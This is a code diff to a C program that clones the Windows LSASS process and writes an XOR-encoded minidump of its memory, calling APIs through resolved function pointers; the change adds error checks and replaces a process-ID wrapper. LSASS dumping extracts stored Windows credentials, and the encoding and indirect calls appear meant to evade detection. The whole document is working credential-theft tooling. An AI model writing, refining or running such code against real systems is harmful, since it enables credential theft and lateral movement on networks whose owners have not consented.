@@ -64,11 +64,6 @@ HANDLE CloneLsassProcess() {
     return hClone;
 }
 
-// Get PID
-DWORD GetProcessIdFromHandle(HANDLE hProcess) {
-    return pGPID(hProcess);
-}
-
 // ==================================
 // Dumping LSASS in memory
 // ==================================
@@ -130,18 +125,23 @@ BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
         log_error("Failed to clone.");
         return FALSE;
     }
-
-    DWORD clonedPID = GetProcessId(hClone);
-
-    if (!InitializeDumpBuffer()) {
-        return FALSE; 
+    
+    DWORD clonedPID = pGPID(hClone);
+    if (!clonedPID) {
+        log_error("Failed to GetProcessId.");
+        return FALSE;
     }
 
+    if (!InitializeDumpBuffer()) {
+        log_error("Failed to InitializeDumpBuffer.");
+        return FALSE; 
+    }
+    
     // Callback configuration
     MINIDUMP_CALLBACK_INFORMATION mci;
     mci.CallbackRoutine = DumpCallbackRoutine;
     mci.CallbackParam = (PVOID)key; // key passed as parameter
-
+    
     // Dump
     BOOL dumped = pMDWD(
         hClone,
@@ -152,7 +152,7 @@ BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
         NULL,
         &mci
     );
-
+    
     if (!dumped) {
         log_error("Dump failed. Error: %lu", GetLastError());        
         HeapFree(GetProcessHeap(), 0, dumpBuffer);
